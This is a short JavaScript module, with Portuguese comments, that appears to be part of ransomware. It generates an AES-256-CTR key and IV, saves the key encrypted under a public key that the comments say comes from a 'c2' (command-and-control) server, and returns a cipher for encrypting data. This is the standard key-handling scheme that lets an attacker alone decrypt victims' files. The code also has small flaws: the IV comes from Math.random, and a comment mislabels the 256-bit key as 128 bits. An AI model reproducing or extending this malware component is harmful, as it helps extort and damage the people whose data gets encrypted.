const Crypto = require("crypto");
const algorithm = "aes-256-ctr";
const encryptionProvider = require("../utils/encryptionProvider");
// Initialization Vector and Key
var IV = Buffer.alloc(16),
  KEY = Crypto.randomBytes(32); // 128 bits
// gera uma sequencia de bytes randomicos para a chave simétrica local

// Randomizando o IV
IV = Buffer.from(
  Array.prototype.map.call(IV, () => {
    return Math.floor(Math.random() * 256);
  })
);

// salva a chave e o IV
const encrptionKey = `${IV.toString("hex")}:${KEY.toString("hex")}`;

/**
 * Cria a chave simétrica de encriptação e a salva
 * encriptada com a chave pública recebida do servidor c2
 * @param { String } publicKey
 * @return { Function } crypto.createCipherIv
 */
const createCipher = publicKey => {
  const provider = new encryptionProvider();
  provider.importPublicKey(publicKey);
  provider.saveEncryptionKey(encrptionKey);

  return Crypto.createCipheriv(algorithm, KEY, IV);
};

module.exports = createCipher;
